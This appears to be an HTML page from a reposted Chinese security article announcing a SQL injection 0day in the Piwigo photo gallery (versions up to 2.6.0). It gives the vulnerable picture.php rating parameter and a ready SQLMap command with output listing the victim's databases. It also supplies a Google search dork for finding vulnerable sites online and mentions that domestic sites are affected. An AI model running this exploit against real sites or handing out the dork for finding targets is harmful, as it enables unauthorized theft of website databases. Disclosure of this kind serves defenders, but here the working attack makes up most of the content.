@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>免费开源相册Piwigo <= v2.6.0 SQL注入漏洞（0day）</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>免费开源相册Piwigo <= v2.6.0 SQL注入漏洞（0day）</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=201432808&amp;idx=1&amp;sn=6f1a3a0ad0544583510a601594122d4e&amp;chksm=2f1a0c63186d8575eb1aa6fd78c82a4dae7f83a22ff152adff04cf1398131ac4fc5e79fbf87a&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=201432808&amp;idx=1&amp;sn=6f1a3a0ad0544583510a601594122d4e&amp;chksm=2f1a0c63186d8575eb1aa6fd78c82a4dae7f83a22ff152adff04cf1398131ac4fc5e79fbf87a&amp;scene=27#wechat_redirect</a></blockquote><p style=""><span style="margin: 0px; padding: 0px; color: rgb(0, 176, 80);"><strong style="margin: 0px; padding: 0px;">Piwigo是世界上最著名的免费开源相册系统之一，由PHP+MySQL架构。由于该框架搭建方便，受到国内外的开发者青睐，近日，Piwigo &lt;= v2.6.0爆出重要0day漏洞。</strong></span></p><p style=""><span style="margin: 0px; padding: 0px; color: rgb(0, 176, 80);"><strong style="margin: 0px; padding: 0px;"><br/></strong></span></p><p style="">漏洞成因,Piwigo相册系统的/piwigo/picture.php页面，没有完整的验证jQuery参数。攻击者成功利用该漏洞，可以获取数据库的全部信息，漏洞及其简单暴力。<br style="margin: 0px; padding: 0px;"/></p><p style="">漏洞影响范围，Piwigo &lt;= v2.6.0。<br style="margin: 0px; padding: 0px;"/></p><p style=""><br/></p><p style=""><strong style="margin: 0px; padding: 0px;">漏洞POC </strong></p><p style=""><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(192, 80, 77);">本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!</span></strong></p><p style=""><strong style="margin: 0px; padding: 0px;"><span style="margin: 0px; padding: 0px; color: rgb(192, 80, 77);"><br/></span></strong></p><pre class="prettyprint lang-sql prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">/piwigo/picture.php?/1/category/1&amp;action=rate (POST parameter: rate=1)
+
+Exploiting with SQLMap:
+
+python sqlmap.py -u "http://192.168.244.129/piwigo/picture.php?/1/category/1&amp;action=rate"; --data
+"rate=1" --dbs
+
+[16:32:25] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
+web application technology: PHP 5.3.2, Apache 2.2.14
+back-end DBMS: MySQL 5
+[16:32:25] [INFO] fetching database names
+[16:32:25] [INFO] fetching number of databases
+[16:32:25] [INFO] resumed: 4
+[16:32:25] [INFO] resumed: information_schema
+[16:32:25] [INFO] resumed: mysql
+[16:32:25] [INFO] resumed: phpmyadmin
+[16:32:25] [INFO] resumed: piwigo
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] phpmyadmin
+[*] piwigo</pre><p style=""><br/></p><p style="">国内部分网站受该漏洞影响，截图</p><p style=""><br/></p><p><img data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR3ibGJmAeFzLxzdYTiaB6p4zQWtqZaQ65nmibMB69BCJFfVg9swsEvUGPWHLComatgicRQDYDKz2OcSXsQ/0" data-ratio="0.41929133858267714" data-w="" src="../Images/226e597ab979766558047ef4f13d8f32.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR3ibGJmAeFzLxzdYTiaB6p4zQWtqZaQ65nmibMB69BCJFfVg9swsEvUGPWHLComatgicRQDYDKz2OcSXsQ/0"/></p><p><br/></p><p style="">Google关键字：inurl:piwigo/picture.php</p><p style=""><br/></p><p><img data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR3ibVOhALzmHibkxNkQRibmNwEodkQ4UZTXNAH5SW4rICxTYgUFXfnV8VPBreDBP1Ag9QWzS7z1Y7U1Zg/0" data-ratio="0.2106299212598425" data-w="" src="../Images/0d87762cb13386da410047108dfa37d0.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR3ibVOhALzmHibkxNkQRibmNwEodkQ4UZTXNAH5SW4rICxTYgUFXfnV8VPBreDBP1Ag9QWzS7z1Y7U1Zg/0"/></p>
+        
+</body>
+</html>
